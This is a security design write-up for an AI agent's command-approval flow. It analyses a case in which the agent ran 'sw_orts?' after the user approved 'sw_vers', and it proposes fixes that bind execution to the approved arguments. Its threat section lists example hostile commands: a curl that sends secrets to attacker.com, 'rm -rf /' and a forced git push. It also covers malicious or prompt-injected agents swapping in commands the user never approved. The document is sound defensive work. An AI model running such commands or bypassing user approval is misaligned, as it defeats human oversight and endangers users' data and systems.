# Critical Security Issue: Command Approval Bypass

## Problem Statement

There is a **critical security vulnerability** in the command approval flow where an agent can execute a different command than what the user approved.

### Current Behavior

When a user approves a command execution:

1. Agent calls `execute_command` with command `"sw_vers"`
2. System validates and creates approval request with `executeArgs: { command: "sw_vers", ... }`
3. User approves the command
4. **Agent is expected to manually call `execute_command_approved` with the same arguments**
5. Agent can call `execute_command_approved` with **DIFFERENT** arguments (e.g., `"sw_orts?"`)
6. System executes the agent-provided command, not the user-approved command

### Evidence

From the user's report:

```
pilot: "I'm about to run the command `sw_vers`..."
user: "yes" (approves)
security log: Command executed: "sw_orts?" ❌
```

The agent told the user it would execute `sw_vers` but actually executed `sw_orts?`.

## Root Cause Analysis

### 1. **Approval Flow Design Flaw**

In `src/core/agent/tools/base-tool.ts` (lines 186-209), when approval is required:

```typescript
if (config.approval) {
  return Effect.gen(function* () {
    const approval = config.approval as NonNullable<typeof config.approval>;
    const approvalMessage = yield* approval.message(validated, context);
    const execute = approval.execute;
    return {
      success: false,
      result: {
        approvalRequired: true,
        message: approvalMessage,
        ...(execute
          ? {
              instruction: `Please ask the user for confirmation. If they confirm, ${execute.toolName} with these exact arguments: ${JSON.stringify(execute.buildArgs(validated))}`,
              executeToolName: execute.toolName,
              executeArgs: execute.buildArgs(validated), // ✅ Pre-built args available
            }
          : {}),
      },
      error: approval.errorMessage ?? "Approval required...",
    } as ToolExecutionResult;
  });
}
```

The system **does** build the correct `executeArgs`, but the current implementation:

- Shows them to the agent as a string in `instruction`
- **Relies on the agent to manually re-type them**
- Provides no mechanism to automatically use the pre-built `executeArgs`

### 2. **No Argument Validation After Approval**

In `src/core/agent/tools/tool-registry.ts` (line 237), when executing a tool:

```typescript
const result = yield * exec(args, context); // ❌ Uses agent-provided args directly
```

There's no check to verify if:

- This execution is the result of an approval flow
- The provided arguments match the pre-approved `executeArgs`

### 3. **LLM Hallucination/Error Risk**

The agent receives a message like:

```
IMPORTANT: After getting user confirmation, you MUST call the execute_command_approved
tool with these exact arguments: {"command": "sw_vers", "workingDirectory": "undefined", "timeout": "undefined"}
```

However:

- The LLM must **parse** this string and **reconstruct** the JSON
- Token sampling errors, hallucinations, or context window issues can cause incorrect arguments
- There's no validation that the args match the approved command

## Security Implications

### High Severity

- **Command Injection**: Agent could execute `rm -rf /` when user approved `ls`
- **Data Exfiltration**: Agent could execute `curl https://attacker.com?data=$(cat secrets)` when user approved benign command
- **Privilege Escalation**: Agent could execute `sudo` commands when user approved non-privileged commands

### Attack Scenarios

1. **Deliberate Malicious Agent**
   - Agent intentionally substitutes approved command with malicious one
   - Example: User approves `git status`, agent executes `git push --force origin master`

2. **LLM Hallucination**
   - Agent unintentionally garbles command due to token sampling
   - Example: User approves `sw_vers`, agent hallucinates `sw_orts?` (actual case!)

3. **Context Manipulation**
   - Attacker injects misleading context causing agent to misinterpret approved command
   - Example: Prompt injection makes agent think user approved different command

## Proposed Solutions

### Solution 1: Automatic Execution After Approval ⭐ **RECOMMENDED**

**Approach**: When user approves, automatically execute the pre-built `executeArgs` without agent intervention.

#### Changes Required

**A. Add approval state tracking**

```typescript
// src/core/agent/tools/tool-registry.ts

interface PendingApproval {
  toolName: string;
  executeArgs: Record<string, unknown>;
  timestamp: number;
  approvalId: string;
}

class DefaultToolRegistry {
  private pendingApprovals: Map<string, PendingApproval> = new Map();

  createApproval(
    toolName: string,
    executeArgs: Record<string, unknown>,
  ): Effect.Effect<string, never> {
    return Effect.sync(() => {
      const approvalId = crypto.randomUUID();
      this.pendingApprovals.set(approvalId, {
        toolName,
        executeArgs,
        timestamp: Date.now(),
        approvalId,
      });
      // Auto-expire after 5 minutes
      setTimeout(() => this.pendingApprovals.delete(approvalId), 5 * 60 * 1000);
      return approvalId;
    });
  }

  executeApproval(
    approvalId: string,
    context: ToolExecutionContext,
  ): Effect.Effect<ToolExecutionResult, Error, ToolRegistry | LoggerService> {
    return Effect.gen(
      function* () {
        const approval = this.pendingApprovals.get(approvalId);
        if (!approval) {
          return {
            success: false,
            result: null,
            error: "Approval not found or expired",
          } as ToolExecutionResult;
        }

        this.pendingApprovals.delete(approvalId);

        // Execute with PRE-APPROVED args, not agent-provided args
        return yield* this.executeTool(
          approval.toolName,
          approval.executeArgs, // ✅ Use stored args
          context,
        );
      }.bind(this),
    );
  }
}
```

**B. Modify base-tool.ts to return approval ID**

```typescript
// src/core/agent/tools/base-tool.ts

if (config.approval) {
  return Effect.gen(function* () {
    const approval = config.approval as NonNullable<typeof config.approval>;
    const approvalMessage = yield* approval.message(validated, context);
    const execute = approval.execute;

    // CREATE APPROVAL ID
    const registry = yield* ToolRegistryTag;
    const approvalId = execute
      ? yield* registry.createApproval(execute.toolName, execute.buildArgs(validated))
      : null;

    return {
      success: false,
      result: {
        approvalRequired: true,
        message: approvalMessage,
        approvalId, // ✅ Return approval ID to system
        ...(execute
          ? {
              instruction: `After user approves, the system will automatically execute this action. Do NOT call ${execute.toolName} manually.`,
              executeToolName: execute.toolName,
            }
          : {}),
      },
      error: approval.errorMessage ?? "Approval required...",
    } as ToolExecutionResult;
  });
}
```

**C. Update UI/CLI to execute approval automatically**

User interface should:

1. Show approval request to user
2. On user approval, call `registry.executeApproval(approvalId, context)`
3. **Agent never sees or provides arguments**

#### Pros

✅ **Maximum Security**: Agent cannot modify approved arguments  
✅ **Zero Trust**: No reliance on agent's accuracy or honesty  
✅ **Simple for Agent**: Agent doesn't need to handle post-approval flow  
✅ **Audit Trail**: Clear separation between request and execution

#### Cons

❌ Requires UI/CLI changes  
❌ More complex state management  
❌ Need to handle approval expiration

---

### Solution 2: Strict Argument Validation

**Approach**: Allow agent to call approved tool but validate arguments match approved args.

#### Changes Required

```typescript
// src/core/agent/tools/shell-tools.ts

export function createExecuteCommandApprovedTool(): Tool<FileSystemContextService> {
  return defineTool<FileSystemContextService, ExecuteCommandApprovedArgs>({
    name: "execute_command_approved",
    // ... other properties ...
    validate: (args) => {
      // VALIDATION 1: Schema validation
      const schema = z
        .object({
          command: z.string().min(1),
          workingDirectory: z.string().optional(),
          timeout: z.number().int().positive().optional(),
          approvalId: z.string().uuid(), // ✅ Require approval ID
        })
        .strict();

      const result = schema.safeParse(args);
      if (!result.success) {
        return { valid: false, errors: result.error.issues.map((i) => i.message) };
      }

      // VALIDATION 2: Check approval exists and args match
      const approval = getPendingApproval(result.data.approvalId);
      if (!approval) {
        return {
          valid: false,
          errors: ["Approval not found or expired. User must re-approve this action."],
        };
      }

      // VALIDATION 3: Args must match exactly
      if (
        !deepEqual(approval.executeArgs, {
          command: result.data.command,
          workingDirectory: result.data.workingDirectory,
          timeout: result.data.timeout,
        })
      ) {
        return {
          valid: false,
          errors: [
            `SECURITY: Arguments don't match approved values.`,
            `Approved: ${JSON.stringify(approval.executeArgs)}`,
            `Provided: ${JSON.stringify(result.data)}`,
          ],
        };
      }

      return { valid: true, value: result.data };
    },
    // ... handler ...
  });
}
```

#### Pros

✅ Relatively simple to implement  
✅ Detects argument mismatches  
✅ Provides clear error messages

#### Cons

❌ Still requires agent to call tool correctly  
❌ Agent could retry with correct args after being caught  
❌ Doesn't prevent intentional bypass attempts  
❌ Deep equality comparison can have edge cases

---

### Solution 3: Signed Approval Tokens (Cryptographic)

**Approach**: Create cryptographically signed approval tokens that encode the approved arguments.

#### Implementation

```typescript
import { createHmac } from "crypto";

function createApprovalToken(
  toolName: string,
  args: Record<string, unknown>,
  secret: string,
): string {
  const payload = JSON.stringify({ toolName, args, timestamp: Date.now() });
  const signature = createHmac("sha256", secret).update(payload).digest("hex");

  return Buffer.from(JSON.stringify({ payload, signature })).toString("base64");
}

function verifyApprovalToken(
  token: string,
  secret: string,
): { toolName: string; args: Record<string, unknown> } | null {
  try {
    const { payload, signature } = JSON.parse(Buffer.from(token, "base64").toString());
    const expectedSignature = createHmac("sha256", secret).update(payload).digest("hex");

    if (signature !== expectedSignature) return null;

    const data = JSON.parse(payload);

    // Check expiration (5 minutes)
    if (Date.now() - data.timestamp > 5 * 60 * 1000) return null;

    return { toolName: data.toolName, args: data.args };
  } catch {
    return null;
  }
}
```

Then modify approved tool to require token:

```typescript
handler: (args: ExecuteCommandApprovedArgs & { approvalToken: string }) => {
  return Effect.gen(function* () {
    const verified = verifyApprovalToken(args.approvalToken, SECRET_KEY);

    if (!verified) {
      return {
        success: false,
        result: null,
        error: "Invalid or expired approval token",
      };
    }

    // Use args from token, NOT from agent input
    const { command, workingDirectory, timeout } = verified.args;

    // Execute with verified args...
  });
};
```

#### Pros

✅ **Cryptographically secure**: Agent cannot forge or modify approval  
✅ Stateless (no need to store pending approvals)  
✅ Time-limited (automatic expiration)  
✅ Can't be bypassed even by malicious agents

#### Cons

❌ Requires secret key management  
❌ Most complex implementation  
❌ Still requires agent to include token in call

---

## Comparison Matrix

| Solution              | Security   | Complexity | Agent Trust Required | State Management |
| --------------------- | ---------- | ---------- | -------------------- | ---------------- |
| **Auto-Execute**      | ⭐⭐⭐⭐⭐ | Medium     | **None** ✅          | Stateful         |
| **Strict Validation** | ⭐⭐⭐     | Low        | Medium               | Stateful         |
| **Signed Tokens**     | ⭐⭐⭐⭐⭐ | High       | Low                  | Stateless        |

## Recommendation

### **Implement Solution 1: Automatic Execution After Approval**

**Rationale**:

1. **Zero Trust Architecture**: Completely eliminates agent from post-approval flow
2. **User Experience**: Clearer flow - user approves, system executes immediately
3. **Auditability**: Clean separation between approval request and execution
4. **Prevents This Exact Issue**: Agent cannot provide different arguments

### Implementation Priority

**Phase 1 (Immediate)**:

- [ ] Add `PendingApproval` storage to ToolRegistry
- [ ] Modify `base-tool.ts` to create approval IDs
- [ ] Update `tool-registry.ts` with `executeApproval` method
- [ ] Add tests for approval flow

**Phase 2 (Follow-up)**:

- [ ] Update CLI to auto-execute on approval
- [ ] Update UI/web interface to auto-execute on approval
- [ ] Add approval expiration handling
- [ ] Add audit logging for all executions

**Phase 3 (Hardening)**:

- [ ] Consider adding signed tokens as additional layer
- [ ] Add rate limiting for approval creation
- [ ] Add monitoring for suspicious approval patterns

## Additional Security Measures

Regardless of solution chosen:

### 1. Enhanced Logging

```typescript
// Log BOTH the approved args and agent-provided args
console.warn(`🔒 SECURITY LOG: Approval request created`, {
  approvalId,
  toolName: execute.toolName,
  approvedArgs: execute.buildArgs(validated),
  requestedBy: context.agentId,
  timestamp: new Date().toISOString(),
});

// On execution, log what was actually executed
console.warn(`🔒 SECURITY LOG: Approval executed`, {
  approvalId,
  toolName,
  executedArgs, // What actually ran
  approvedBy: context.userId,
  executedBy: context.agentId,
  timestamp: new Date().toISOString(),
});
```

### 2. User Confirmation Display

Always show user **exactly** what will be executed:

```
⚠️  COMMAND EXECUTION REQUEST ⚠️

The agent requests permission to execute:

  Command:     sw_vers
  Directory:   /Users/lvndry/github/jazz
  Timeout:     30000ms

This command will run with your user privileges.

[Approve] [Deny]
```

### 3. Prompt Enhancement

Add to agent system prompt:

```markdown
## CRITICAL SECURITY RULES

When a tool requires approval:

1. You MUST show the user exactly what you're requesting
2. After user approves, DO NOT call the approved tool yourself
3. The system will automatically execute the approved action
4. NEVER attempt to modify approved arguments
5. ANY deviation from approved arguments is a security violation
```

### 4. Dangerous Pattern Detection

The existing dangerous pattern checks in `shell-tools.ts` (lines 197-252) are good, but add:

```typescript
// Check if command differs from any recent approval request
const recentApprovals = getRecentApprovals(context.agentId);
const matchingApproval = recentApprovals.find(
  (a) => a.args.command && args.command !== a.args.command,
);

if (matchingApproval) {
  yield *
    logger.warn(`⚠️  SECURITY: Command mismatch detected!`, {
      approved: matchingApproval.args.command,
      attempted: args.command,
      agentId: context.agentId,
    });

  return {
    success: false,
    result: null,
    error: `Security violation: Attempted to execute "${args.command}" but user approved "${matchingApproval.args.command}"`,
  };
}
```

## Conclusion

This is a **critical security vulnerability** that must be addressed immediately. The recommended solution (Automatic Execution After Approval) provides the strongest security guarantees by removing the agent from the post-approval execution path entirely.

The current design incorrectly trusts the agent to accurately relay approved arguments, creating a significant attack surface for both malicious agents and unintentional LLM errors.

## References

- `src/core/agent/tools/base-tool.ts` (lines 186-209) - Approval creation
- `src/core/agent/tools/shell-tools.ts` (lines 83-118) - Approval message generation
- `src/core/agent/tools/tool-registry.ts` (line 237) - Tool execution
- Security log from user report showing `sw_vers` → `sw_orts?` substitution
